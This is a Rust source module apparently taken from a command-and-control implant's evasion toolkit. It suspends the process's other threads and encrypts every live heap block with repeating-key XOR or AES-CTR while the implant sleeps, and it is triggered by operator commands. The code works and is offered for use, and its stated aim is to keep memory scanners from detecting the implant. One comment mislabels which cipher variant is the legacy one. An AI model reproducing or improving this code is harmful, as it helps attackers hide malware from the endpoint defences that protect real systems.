// evasion/heap.rs
//
// Process-heap protection during sleep:
//   - Thread suspension / resumption around heap operations
//   - XOR-based heap encryption (legacy, 16-byte repeating key)
//   - AES-256-GCM stream-cipher heap encryption (upgrade, same-length output)
//
// CRITICAL: The process heap is shared across ALL threads.  If any thread
// accesses the heap while it is encrypted the process will access-violate.
// Always call suspend_other_threads() before encrypting and resume_threads()
// after decrypting.  Do NOT call these functions from inside ekko_sleep —
// suspending Tokio worker threads while they hold the allocator lock causes
// deadlock.  Reserve explicit heap encryption for operator commands
// (evasion:encrypt_heap_aes / evasion:decrypt_heap_aes).

// ── Thread Suspension ──────────────────────────────────────────────────

#[cfg(target_os = "windows")]
pub fn suspend_other_threads() -> Vec<*mut std::ffi::c_void> {
    use std::ffi::c_void;
    use std::mem;

    extern "system" {
        fn GetCurrentProcessId() -> u32;
        fn GetCurrentThreadId() -> u32;
        fn CreateToolhelp32Snapshot(flags: u32, pid: u32) -> *mut c_void;
        fn Thread32First(snap: *mut c_void, entry: *mut ThreadEntry32) -> i32;
        fn Thread32Next(snap: *mut c_void, entry: *mut ThreadEntry32) -> i32;
        fn OpenThread(access: u32, inherit: i32, tid: u32) -> *mut c_void;
        fn SuspendThread(thread: *mut c_void) -> u32;
        fn CloseHandle(h: *mut c_void) -> i32;
    }

    #[repr(C)]
    struct ThreadEntry32 {
        dw_size:               u32,
        _cnt_usage:            u32,
        th32_thread_id:        u32,
        th32_owner_process_id: u32,
        _tp_base_pri:          i32,
        _tp_delta_pri:         i32,
        _dw_flags:             u32,
    }

    const TH32CS_SNAPTHREAD:    u32 = 0x4;
    const THREAD_SUSPEND_RESUME:u32 = 0x0002;

    let mut handles = Vec::new();

    unsafe {
        let pid    = GetCurrentProcessId();
        let my_tid = GetCurrentThreadId();
        let snap   = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if snap.is_null() || snap == (-1isize as *mut c_void) { return handles; }

        let mut te: ThreadEntry32 = mem::zeroed();
        te.dw_size = mem::size_of::<ThreadEntry32>() as u32;

        if Thread32First(snap, &mut te) != 0 {
            loop {
                if te.th32_owner_process_id == pid && te.th32_thread_id != my_tid {
                    let h = OpenThread(THREAD_SUSPEND_RESUME, 0, te.th32_thread_id);
                    if !h.is_null() {
                        SuspendThread(h);
                        handles.push(h);
                    }
                }
                if Thread32Next(snap, &mut te) == 0 { break; }
            }
        }
        CloseHandle(snap);
    }
    handles
}

#[cfg(target_os = "windows")]
pub fn resume_threads(handles: Vec<*mut std::ffi::c_void>) {
    use std::ffi::c_void;
    extern "system" {
        fn ResumeThread(thread: *mut c_void) -> u32;
        fn CloseHandle(h: *mut c_void) -> i32;
    }
    unsafe {
        for h in handles {
            ResumeThread(h);
            CloseHandle(h);
        }
    }
}

#[cfg(not(target_os = "windows"))]
pub fn suspend_other_threads() -> Vec<*mut std::ffi::c_void> { Vec::new() }

#[cfg(not(target_os = "windows"))]
pub fn resume_threads(_handles: Vec<*mut std::ffi::c_void>) {}

// ── XOR Heap Encryption (legacy) ──────────────────────────────────────
// Walks the process heap via HeapWalk and XORs every live block with a
// repeating 16-byte key.  Self-inverse: calling with the same key
// restores the original content.
//
// Prefer encrypt_heap_aes256gcm for new deployments — the XOR key is
// short and the operation is detectable by comparing heap bytes against
// a repeating pattern.  The AES variant is kept for backward compat
// with existing operator playbooks that reference evasion:encrypt_heap.

#[cfg(target_os = "windows")]
pub fn encrypt_heap(xor_key: &[u8; 16]) -> Result<usize, String> {
    use std::ffi::c_void;

    #[repr(C)]
    struct ProcessHeapEntry {
        data:         *mut c_void,
        size:         usize,
        overhead:     u8,
        region_index: u8,
        flags:        u16,
        _union:       [u8; 32],
    }

    extern "system" {
        fn GetProcessHeap() -> *mut c_void;
        fn HeapLock(heap: *mut c_void) -> i32;
        fn HeapUnlock(heap: *mut c_void) -> i32;
        fn HeapWalk(heap: *mut c_void, entry: *mut ProcessHeapEntry) -> i32;
    }

    const PROCESS_HEAP_ENTRY_BUSY: u16 = 0x4;

    unsafe {
        let heap = GetProcessHeap();
        if heap.is_null() { return Err("GetProcessHeap failed".into()); }
        if HeapLock(heap) == 0 { return Err("HeapLock failed".into()); }

        let mut entry: ProcessHeapEntry = std::mem::zeroed();
        let mut encrypted_blocks = 0usize;

        while HeapWalk(heap, &mut entry) != 0 {
            if entry.flags & PROCESS_HEAP_ENTRY_BUSY != 0
                && entry.size >= 16
                && !entry.data.is_null()
            {
                let block = std::slice::from_raw_parts_mut(entry.data as *mut u8, entry.size);
                for (i, byte) in block.iter_mut().enumerate() {
                    *byte ^= xor_key[i % 16];
                }
                encrypted_blocks += 1;
            }
        }

        HeapUnlock(heap);
        Ok(encrypted_blocks)
    }
}

#[cfg(not(target_os = "windows"))]
pub fn encrypt_heap(_xor_key: &[u8; 16]) -> Result<usize, String> { Ok(0) }

/// XOR is its own inverse — decrypt by calling encrypt with the same key.
pub fn decrypt_heap(xor_key: &[u8; 16]) -> Result<usize, String> {
    encrypt_heap(xor_key)
}

// ── AES-256-GCM Heap Encryption ───────────────────────────────────────
// Replaces the 16-byte repeating-XOR with AES-256-GCM in CTR stream mode.
// The GCM authentication tag is discarded; ciphertext length == plaintext
// length, making the operation drop-in for in-place heap block encryption.
//
// Self-inverse property: AES-CTR keystream is deterministic, so calling
// encrypt_heap_aes256gcm twice with the same (key, nonce) restores the
// original bytes, just as XOR does.
//
// Nonce uniqueness: each heap block derives its nonce by XOR-ing the
// 32-bit block index into the first four bytes of base_nonce, preventing
// GCM nonce reuse across blocks within one sleep cycle.
//
// Zero heap allocation: encrypt_in_place_detached (AeadInPlace) modifies
// the block in place and returns the tag as a fixed-size stack array that
// is discarded — no heap allocation while HeapLock is held.

#[cfg(target_os = "windows")]
pub fn encrypt_heap_aes256gcm(key: &[u8; 32], base_nonce: &[u8; 12]) -> Result<usize, String> {
    use aes_gcm::{aead::AeadInPlace, Aes256Gcm, KeyInit, Nonce};
    use std::ffi::c_void;

    #[repr(C)]
    struct ProcessHeapEntry {
        data:         *mut c_void,
        size:         usize,
        overhead:     u8,
        region_index: u8,
        flags:        u16,
        _union:       [u8; 32],
    }

    extern "system" {
        fn GetProcessHeap() -> *mut c_void;
        fn HeapLock(heap: *mut c_void) -> i32;
        fn HeapUnlock(heap: *mut c_void) -> i32;
        fn HeapWalk(heap: *mut c_void, entry: *mut ProcessHeapEntry) -> i32;
    }

    const PROCESS_HEAP_ENTRY_BUSY: u16 = 0x4;

    // Key schedule is stack-allocated (~240 bytes) — no heap alloc.
    let cipher = Aes256Gcm::new_from_slice(key).map_err(|e| format!("cipher init: {e}"))?;

    unsafe {
        let heap = GetProcessHeap();
        if heap.is_null() { return Err("GetProcessHeap failed".into()); }
        if HeapLock(heap) == 0 { return Err("HeapLock failed".into()); }

        let mut entry: ProcessHeapEntry = std::mem::zeroed();
        let mut count: usize = 0;
        let mut block_idx: u32 = 0;

        while HeapWalk(heap, &mut entry) != 0 {
            if entry.flags & PROCESS_HEAP_ENTRY_BUSY != 0
                && entry.size >= 16
                && !entry.data.is_null()
            {
                let mut bn = *base_nonce;
                let ix = block_idx.to_le_bytes();
                bn[0] ^= ix[0]; bn[1] ^= ix[1];
                bn[2] ^= ix[2]; bn[3] ^= ix[3];
                let nonce = Nonce::from_slice(&bn);

                let block = std::slice::from_raw_parts_mut(entry.data as *mut u8, entry.size);
                // Tag returned on the stack and discarded — no allocation.
                let _ = cipher.encrypt_in_place_detached(nonce, b"", block);

                count += 1;
                block_idx = block_idx.wrapping_add(1);
            }
        }

        HeapUnlock(heap);
        Ok(count)
    }
}

/// CTR stream is self-inverse — decrypt by calling encrypt with the same key+nonce.
#[cfg(target_os = "windows")]
pub fn decrypt_heap_aes256gcm(key: &[u8; 32], base_nonce: &[u8; 12]) -> Result<usize, String> {
    encrypt_heap_aes256gcm(key, base_nonce)
}

#[cfg(not(target_os = "windows"))]
pub fn encrypt_heap_aes256gcm(_key: &[u8; 32], _base_nonce: &[u8; 12]) -> Result<usize, String> { Ok(0) }

#[cfg(not(target_os = "windows"))]
pub fn decrypt_heap_aes256gcm(_key: &[u8; 32], _base_nonce: &[u8; 12]) -> Result<usize, String> { Ok(0) }

#[cfg(test)]
mod tests {
    use super::*;

    // ── Non-Windows stubs ─────────────────────────────────────────────────

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn suspend_other_threads_returns_empty_on_non_windows() {
        assert!(suspend_other_threads().is_empty());
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn resume_threads_empty_vec_does_not_panic() {
        resume_threads(Vec::new()); // should be a no-op
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn encrypt_heap_xor_returns_zero_blocks_on_non_windows() {
        assert_eq!(encrypt_heap(&[0u8; 16]).unwrap(), 0);
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn decrypt_heap_xor_returns_zero_blocks_on_non_windows() {
        assert_eq!(decrypt_heap(&[0u8; 16]).unwrap(), 0);
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn encrypt_heap_aes_returns_zero_blocks_on_non_windows() {
        assert_eq!(encrypt_heap_aes256gcm(&[0u8; 32], &[0u8; 12]).unwrap(), 0);
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn decrypt_heap_aes_returns_zero_blocks_on_non_windows() {
        assert_eq!(decrypt_heap_aes256gcm(&[0u8; 32], &[0u8; 12]).unwrap(), 0);
    }

    // ── XOR cipher properties ─────────────────────────────────────────────
    //
    // encrypt_heap() operates on the live process heap via HeapLock +
    // HeapWalk.  Calling it directly in a test would encrypt the test
    // framework's own heap allocations, crash the runner, or deadlock.
    //
    // Instead these tests exercise the same XOR logic on isolated stack
    // buffers, verifying the mathematical properties that the heap
    // function relies on.

    fn xor_buf(buf: &mut [u8], key: &[u8; 16]) {
        for (i, b) in buf.iter_mut().enumerate() { *b ^= key[i % 16]; }
    }

    #[test]
    fn xor_is_self_inverse() {
        let key = [0xAB_u8; 16];
        let original = *b"evasion xor test";
        let mut buf = original;
        xor_buf(&mut buf, &key);
        assert_ne!(buf, original, "XOR must change the bytes");
        xor_buf(&mut buf, &key);
        assert_eq!(buf, original, "second XOR must restore original");
    }

    #[test]
    fn xor_zero_key_is_identity() {
        let key = [0u8; 16];
        let original = [0xCC_u8; 16];
        let mut buf = original;
        xor_buf(&mut buf, &key);
        assert_eq!(buf, original);
    }

    #[test]
    fn xor_all_ones_key_flips_every_bit() {
        let key = [0xFF_u8; 16];
        let mut buf = [0x00_u8; 16];
        xor_buf(&mut buf, &key);
        assert_eq!(buf, [0xFF_u8; 16]);
    }

    #[test]
    fn xor_different_keys_produce_different_outputs() {
        let plaintext = [0x55_u8; 16];
        let mut a = plaintext;
        let mut b = plaintext;
        xor_buf(&mut a, &[0x11_u8; 16]);
        xor_buf(&mut b, &[0x22_u8; 16]);
        assert_ne!(a, b);
    }

    #[test]
    fn xor_repeating_key_pattern_applies_modularly() {
        // With a 16-byte key and a 32-byte buffer the second 16 bytes get
        // the same keystream as the first — XOR is independently verifiable.
        let key: [u8; 16] = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15];
        let mut buf = [0u8; 32];
        xor_buf(&mut buf, &key);
        // Byte at offset 0 and offset 16 should both equal key[0] = 0 XOR 0 = 0.
        assert_eq!(buf[0], buf[16]);
        // Byte at offset 1 and offset 17 should both equal key[1] = 1.
        assert_eq!(buf[1], buf[17]);
    }

    // ── AES-256-GCM stream cipher properties ──────────────────────────────
    //
    // encrypt_heap_aes256gcm also operates on the live heap and is not
    // safe to call directly in tests.  The following tests verify the same
    // underlying properties using the aes_gcm crate primitives directly
    // on isolated buffers.

    #[test]
    fn aes256gcm_stream_is_self_inverse() {
        use aes_gcm::{aead::AeadInPlace, Aes256Gcm, KeyInit, Nonce};
        let key   = [0x42_u8; 32];
        let nonce = [0x13_u8; 12];
        let orig  = *b"aes stream test buffer 32 bytes!";
        let mut buf = orig.to_vec();

        let cipher = Aes256Gcm::new_from_slice(&key).unwrap();
        let n = Nonce::from_slice(&nonce);
        let _ = cipher.encrypt_in_place_detached(n, b"", &mut buf);
        assert_ne!(buf.as_slice(), &orig[..], "encrypt must change bytes");
        let _ = cipher.encrypt_in_place_detached(n, b"", &mut buf);
        assert_eq!(buf.as_slice(), &orig[..], "second call must restore original");
    }

    #[test]
    fn aes256gcm_different_keys_give_different_ciphertext() {
        use aes_gcm::{aead::AeadInPlace, Aes256Gcm, KeyInit, Nonce};
        let nonce     = Nonce::from_slice(&[0u8; 12]);
        let plaintext = [0xAA_u8; 32];
        let mut a = plaintext.to_vec();
        let mut b = plaintext.to_vec();
        Aes256Gcm::new_from_slice(&[0x01_u8; 32]).unwrap()
            .encrypt_in_place_detached(nonce, b"", &mut a).unwrap();
        Aes256Gcm::new_from_slice(&[0x02_u8; 32]).unwrap()
            .encrypt_in_place_detached(nonce, b"", &mut b).unwrap();
        assert_ne!(a, b);
    }

    #[test]
    fn aes256gcm_different_nonces_give_different_ciphertext() {
        use aes_gcm::{aead::AeadInPlace, Aes256Gcm, KeyInit, Nonce};
        let cipher    = Aes256Gcm::new_from_slice(&[0x55_u8; 32]).unwrap();
        let plaintext = [0xBB_u8; 32];
        let mut a = plaintext.to_vec();
        let mut b = plaintext.to_vec();
        cipher.encrypt_in_place_detached(Nonce::from_slice(&[0u8; 12]), b"", &mut a).unwrap();
        cipher.encrypt_in_place_detached(Nonce::from_slice(&[1u8; 12]), b"", &mut b).unwrap();
        assert_ne!(a, b);
    }

    #[test]
    fn aes256gcm_output_length_equals_input_length() {
        // The tag is returned separately and discarded — output is same length
        // as input, which is the whole point for in-place heap block encryption.
        use aes_gcm::{aead::AeadInPlace, Aes256Gcm, KeyInit, Nonce};
        let cipher = Aes256Gcm::new_from_slice(&[0xDE_u8; 32]).unwrap();
        let nonce  = Nonce::from_slice(&[0u8; 12]);
        for len in [16, 32, 100, 255, 1024] {
            let mut buf = vec![0xAA_u8; len];
            cipher.encrypt_in_place_detached(nonce, b"", &mut buf).unwrap();
            assert_eq!(buf.len(), len, "output len must equal input len for block size {len}");
        }
    }

    // ── Per-block nonce derivation ─────────────────────────────────────────
    // Mirrors the logic inside encrypt_heap_aes256gcm to verify uniqueness.

    fn derive_nonce(base: &[u8; 12], idx: u32) -> [u8; 12] {
        let mut n = *base;
        let b = idx.to_le_bytes();
        n[0] ^= b[0]; n[1] ^= b[1]; n[2] ^= b[2]; n[3] ^= b[3];
        n
    }

    #[test]
    fn adjacent_block_indices_produce_different_nonces() {
        let base = [0x5A_u8; 12];
        assert_ne!(derive_nonce(&base, 0), derive_nonce(&base, 1));
        assert_ne!(derive_nonce(&base, 1), derive_nonce(&base, 2));
    }

    #[test]
    fn non_adjacent_block_indices_produce_different_nonces() {
        let base = [0x5A_u8; 12];
        assert_ne!(derive_nonce(&base, 0),   derive_nonce(&base, 255));
        assert_ne!(derive_nonce(&base, 0),   derive_nonce(&base, 256));
        assert_ne!(derive_nonce(&base, 100), derive_nonce(&base, 200));
    }

    #[test]
    fn nonce_derivation_is_deterministic() {
        let base = [0xFF_u8; 12];
        assert_eq!(derive_nonce(&base, 42), derive_nonce(&base, 42));
        assert_eq!(derive_nonce(&base, 0),  derive_nonce(&base, 0));
    }

    #[test]
    fn index_zero_nonce_equals_base() {
        // XOR with [0,0,0,0] leaves the base unchanged.
        let base = [0xAB_u8; 12];
        assert_eq!(derive_nonce(&base, 0), base);
    }

    #[test]
    fn nonce_derivation_does_not_panic_at_u32_max() {
        let base = [0x00_u8; 12];
        let _ = derive_nonce(&base, u32::MAX);
    }

    #[test]
    fn wrapping_add_does_not_panic() {
        // block_idx uses wrapping_add so u32::MAX + 1 wraps to 0, not panic.
        let mut idx: u32 = u32::MAX;
        idx = idx.wrapping_add(1);
        assert_eq!(idx, 0);
    }
}
